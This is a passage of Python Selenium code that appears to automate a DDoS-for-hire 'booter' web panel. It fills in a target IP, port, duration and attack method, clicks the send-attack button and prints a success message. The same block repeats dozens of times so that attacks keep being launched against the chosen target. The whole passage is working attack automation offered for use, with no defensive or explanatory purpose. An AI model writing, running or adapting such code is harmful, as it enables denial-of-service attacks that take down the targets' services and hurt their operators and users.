port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
